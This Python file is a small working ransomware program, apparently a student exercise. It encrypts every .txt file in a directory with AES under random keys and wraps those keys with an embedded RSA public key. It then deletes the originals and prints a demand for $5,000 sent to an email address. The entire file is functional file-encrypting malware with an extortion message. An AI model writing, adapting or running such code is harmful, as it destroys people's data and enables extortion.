import os
import re
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad

pktext = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4tC3LrMc4cExt66fKKG/\nqVMsCf6XUcZ1AkDdxHqwDQd3pR6mDEFzLMN40Hxftcu2ygmmXpNnwlqiaqHCP7nb\n1gjX7ftALM9sUzo+SGZAlZQT98yA2vbpjgXocZyFTRVLFoJuO164i/g1j5wRqp/P\n0l0oddUiNP/5IMvnCF43mk8cqCvPELBpLmAVQPe6IkT00TEF3lk3MuBcAydPX+fS\nqSDis3Z43jK6d61DY7khgcXoEw49QJBawJb5YlNSQH7z1+fDhp9kaWQ4lVGzWjoi\nfMEyh9Y5CVmkgkzDxBd3pLu98ufgH5jp9tDpgalyORoLwLgfdB46o16JIT45vXIP\njQIDAQAB\n-----END PUBLIC KEY-----'

publickey = RSA.import_key(pktext) #public key imported

files = os.listdir("Mydirectory")

for file1 in files:
	match = re.search("\.txt$",file1)
	if match:
		var= file1
		str1="./Mydirectory/" + str(var)
		myFile = open(str1, mode='r', encoding='utf-8-sig')
		readf = myFile.read() #reading the file content
		key = get_random_bytes(16) #generate random 16 bytes
		iv = get_random_bytes(16) #generate random 16 bytes
		data= readf.encode("utf-8")
		cipherE = AES.new(key, AES.MODE_CBC, iv=iv)
		ct= cipherE.encrypt(pad(data, AES.block_size))#u have a cipher and now u want to encrypt something. So now u have added data and encrypted it. so ct is cipher text
		str2 = var.replace('.txt','')
		str3="./Mydirectory/" + str(str2)
		myFile.close()
		writeFile = open(str3+".enc", "wb")
		tr1=str(ct)
		writeFile.write(bytes(tr1,"ascii"))
		writeFile.close()
		writeFile = open(str3+".enc", "ab")
		cipher_rsa = PKCS1_OAEP.new(publickey)
		enc_key0 = cipher_rsa.encrypt(key)
		enc_key1 = str(enc_key0)
		enc_key = bytes(enc_key1, "utf-8")
		
		enc_iv0 = cipher_rsa.encrypt(iv)
		enc_iv1 = str(enc_iv0)
		enc_iv = bytes(enc_iv1, "utf-8")
		
		newline = "\n"
		writeFile.write(bytes(newline,"ascii"))
		writeFile.write(enc_key)
		writeFile.write(bytes(newline,"ascii"))
		writeFile.write(enc_iv)
		writeFile.close()
		os.remove(str1)
print("Your text files are encrypted. To decrypt them, you need to pay me $5,000 and send ransomkey.bin in your folder to rmd724@uowmail.edu.au")
